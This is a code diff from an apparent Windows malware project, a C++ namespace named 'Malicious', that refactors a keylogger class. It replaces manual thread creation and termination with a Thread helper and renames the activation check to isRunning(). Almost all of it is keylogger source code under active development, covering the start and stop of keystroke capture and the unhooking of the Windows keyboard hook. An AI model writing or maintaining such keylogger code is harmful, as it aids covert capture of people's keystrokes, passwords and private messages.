@@ -26,7 +26,7 @@ namespace Malicious
             return next;
         }
 
-        if(!Keylogger::instance().activated())
+		if(!Keylogger::instance().isRunning())
         {
             return next;
         }
@@ -167,40 +167,23 @@ namespace Malicious
     {
         TRACE_FUNCTION
         // on ne démarre le keylogger uniquement s'il n'est pas déjà actif
-        if(!isActivated)
-        {
-            hThread = CreateThread(0, 0,(LPTHREAD_START_ROUTINE)MsgLoop, 0, 0, &dwThread);
-		    if(hThread == NULL)
-		    {
-			    LOG << "CreateThreadfailed : " + Common::toString(GetLastError());
-		    }
-            LOG << "Keylogging enabled";
-            isActivated = true;
-        }
+        Thread::start((LPTHREAD_START_ROUTINE)MsgLoop);
+        LOG << "Keylogging enabled";
     }
             
     void Keylogger::stop()
     {
         TRACE_FUNCTION
-        if(isActivated)
+        if(isRunning())
         {
-            if(!TerminateThread(hThread, 0))
-		    {
-			    LOG << "TerminateThread failed : " + Common::toString(GetLastError());
-		    }
+            Thread::stop();
 
             if(!UnhookWindowsHookEx(hook))
 		    {
 			    LOG << "UnhookWindowsHookEx failed : " + Common::toString(GetLastError());
 		    }
             LOG << "Keylogging disabled";
-            isActivated = false;
         }
-    }
-            
-    bool Keylogger::activated()
-    {
-        return isActivated;
     }
     
     void Keylogger::flush()
